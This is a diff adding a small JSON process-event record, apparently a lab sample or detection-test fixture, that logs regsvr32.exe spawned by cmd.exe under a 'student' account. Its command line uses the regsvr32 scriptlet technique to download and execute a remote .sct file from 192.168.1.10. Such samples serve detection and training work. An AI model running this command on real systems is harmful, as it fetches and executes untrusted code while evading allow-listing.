@@ -1,0 +1,12 @@
+{
+ "Image": "C:\\Windows\\System32\\regsvr32.exe",
+ "CommandLine": "regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll",
+ "OriginalFileName": "REGSVR32.EXE",
+ "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+ "ParentCommandLine": "C:\\Windows\\system32\\cmd.exe",
+ "User": "LABPC\\student",
+ "IntegrityLevel": "Medium",
+ "Description": "",
+ "Product": "",
+ "Company": ""
+}
